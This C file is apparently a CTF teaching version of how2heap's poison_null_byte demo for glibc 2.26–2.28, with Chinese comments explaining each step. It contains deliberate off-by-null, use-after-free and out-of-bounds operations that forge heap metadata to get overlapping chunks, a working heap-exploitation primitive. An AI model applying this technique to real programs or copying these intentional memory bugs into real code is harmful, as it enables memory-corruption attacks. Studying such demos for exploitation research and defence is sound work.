/*
 * 中文导读（CTF 版）
 *
 * 手法：Poison Null Byte
 * 文件标注范围：glibc 2.26～2.28，x86-64 上游堆管理器。
 * 模拟漏洞：只能向相邻 chunk 的 size 最低字节写一个 NUL（off-by-null）。
 * 成功判据：最终 assert 证明新分配 chunk 与仍在使用的 victim 重叠。
 *
 * 2.26 起 unlink 会检查 chunksize(P)==prev_size(next_chunk(P))。本链把尺寸放大到 largebin/tcache 上限之外，并在缩小后的 b 尾部伪造一致的 next->prev_size；随后仍利用 c 的陈旧 prev_size 制造跨 b2 合并。
 *
 * 来源：shellphish/how2heap poison_null_byte.c；本目录按 glibc 源码边界
 * 重命名、补充中文导读并在对应运行时验证。程序故意包含 UAF、越界写
 * 和对已释放 chunk 的读取，只能用于 CTF/教学与授权研究。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	uint8_t* a;
	uint8_t* b;
	uint8_t* c;
	uint8_t* b1;
	uint8_t* b2;
	uint8_t* d;
	void *barrier;

	a = (uint8_t*) malloc(0x500);

	int real_a_size = malloc_usable_size(a);

	/*
	 * 被毒化 chunk 的原 size 低字节不能本来就是 0x00，否则 off-by-null 不会
	 * 改变有效尺寸。本例选择请求值加 header 后低字节为 0x10，空字节覆盖会
	 * 把物理尺寸向下截短 0x10，同时清除 PREV_INUSE。
	 */
	b = (uint8_t*) malloc(0xa00);

	c = (uint8_t*) malloc(0x500);

	barrier =  malloc(0x100);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8);

	// 提交 17f487b 增加 chunksize(P)==prev_size(next_chunk(P)) 检查，需提前伪造截短后的边界。
	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
	// 因而攻击者必须能向 b 内部写完整机器字，只有字符串式写入、遇空字节停止时通常不够。
	// 需要在截短后 next_chunk 位置 b+0x9f0 写入 prev_size=0xa00；下方执行真实写入。
	// off-by-null 把 0xa11 截成 0xa00，因此在新 next_chunk 处写入同值，满足一致性检查。
	*(size_t*)(b+0x9f0) = 0xa00;

	// 先释放 b，再用 a 的 off-by-null 修改这个 free chunk 的 size 元数据。
	free(b);

	a[real_a_size] = 0; // 漏洞触发：越过 a 用户区一字节，把 b->size 最低字节清零。

	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;

	// 下一次 malloc 会对原 b 所在 free chunk 执行 unlink。提交 17f487b 会核对
	// chunksize(P) 与 prev_size(next_chunk(P))；前面已在截短后的新边界写入
	// 相同值，因此不会把预期利用判为 corrupted size vs. prev_size。
	// next_chunk(P) == b-0x10+0xa00 == b+0x9f0
	// prev_size (next_chunk(P)) == *(b+0x9f0) == 0xa00

	b1 = malloc(0x500);

	// 真题中的 b2 往往是含函数指针、长度或对象指针的活动结构；重叠后即可控制这些字段。

	b2 = malloc(0x480);

	memset(b2,'B',0x480);

	free(b1);
	free(c);
	
	d = malloc(0xc00);

	memset(d,'D',0xc00);

	assert(strstr(b2, "DDDDDDDDDDDD"));
}
